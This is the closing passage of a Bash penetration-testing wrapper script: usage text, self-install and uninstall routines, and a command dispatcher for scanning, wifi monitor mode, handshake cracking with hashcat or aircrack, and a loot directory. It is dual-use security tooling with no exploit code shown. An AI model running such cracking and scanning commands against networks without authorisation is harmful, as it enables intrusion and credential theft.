    echo "    crack <cap>      Handshake cracking (hashcat/aircrack/john/cowpatty)"
    echo "    session <act>    start|resume|status|list|export|notes"
    echo "    history          Show target history"
    echo "    favorite         Manage favorites (add/list/use)"
    echo "    alias            Manage aliases"
    echo "    profile          Manage scan presets"
    echo "    discover [net]   Discover hosts and pick target"
    echo "    export <f> <fmt> Export to json/csv/html/md"
    echo "    schedule         Manage scheduled scans"
    echo "    diff <f1> <f2>   Compare two scan outputs"
    echo "    status           Show installed tools"
    echo "    install          Full arsenal install (requires root)"
    echo "    install-quick    Essential tools install (requires root)"
    echo "    menu             Interactive menu"
    echo "    help             Show this help"
    echo
    echo "Examples:"
    echo "    $SCRIPT_NAME scan 192.168.1.0/24 --quick"
    echo "    $SCRIPT_NAME wifi --monitor wlan0"
    echo "    $SCRIPT_NAME crack handshake.cap --hashcat-rules"
    echo "    $SCRIPT_NAME profile save fast --quick"
    echo "    $SCRIPT_NAME schedule add '0 2 * * *' 'scan 192.168.1.1 --full'"
    echo "    $SCRIPT_NAME discover 192.168.1.0/24"
    echo "    $SCRIPT_NAME status"
    echo "    $SCRIPT_NAME menu"
}

self_install() {
    local install_path="/usr/local/bin/$SCRIPT_NAME"
    
    if [[ $EUID -ne 0 ]]; then
        log_error "Installation requires root"
        echo "    Run: sudo $0 --install"
        exit 1
    fi
    
    cp "$0" "$install_path"
    chmod +x "$install_path"
    log_success "Installed to $install_path"
    echo -e "    Run '${C_VENOM}$SCRIPT_NAME${C_RESET}' from anywhere"
}

self_uninstall() {
    local install_path="/usr/local/bin/$SCRIPT_NAME"
    
    if [[ $EUID -ne 0 ]]; then
        log_error "Uninstallation requires root"
        echo "    Run: sudo $0 --uninstall"
        exit 1
    fi
    
    rm -f "$install_path"
    echo -ne "    ${C_GHOST}Remove config and logs? [y/N]: ${C_RESET}"
    read -r confirm
    [[ "${confirm,,}" == "y" ]] && rm -rf "$CONFIG_DIR"
    log_success "Uninstalled"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

main() {
    # Handle install/uninstall first
    case "${1:-}" in
        --install)   self_install; exit 0 ;;
        --uninstall) self_uninstall; exit 0 ;;
    esac

    load_config
    ensure_builtin_aliases

    if expand_aliases "$@"; then
        set -- "${EXPANDED_ARGS[@]}"
    fi

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -q|--quiet) QUIET=1; shift ;;
            --json) JSON_OUTPUT=1; QUIET=1; NO_COLOR=1; shift ;;
            --no-color) NO_COLOR=1; shift ;;
            --update) check_for_update; exit 0 ;;
            *) break ;;
        esac
    done

    # Initialize directories
    mkdir -p "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR"

    # Legal disclaimer check
    check_legal
    
    # Parse arguments
    case "${1:-}" in
        ""|menu|-i)  main_menu ;;
        scan)        shift; cli_scan "$@" ;;
        wifi)        shift; cli_wifi "$@" ;;
        crack)       shift; cli_crack "$@" ;;
        session)     shift; cli_session "$@" ;;
        history)     show_history ;;
        favorite)    shift; favorite_cmd "$@" ;;
        alias)       shift; alias_cmd "$@" ;;
        profile)     shift; profile_cmd "$@" ;;
        discover)    shift; discover_cmd "$@" ;;
        export)      shift; export_cmd "$@" ;;
        schedule)    shift; schedule_cmd "$@" ;;
        diff)        shift; diff_cmd "$@" ;;
        status)      cmd_tool_status ;;
        install)     cmd_install_arsenal ;;
        install-quick) cmd_install_quick ;;
        help|-h|--help) show_usage ;;
        version|-v|--version) echo "$SCRIPT_NAME v$VERSION ($CODENAME)" ;;
        *)           log_error "Unknown command: $1"; show_usage; exit 1 ;;
    esac
}

main "$@"
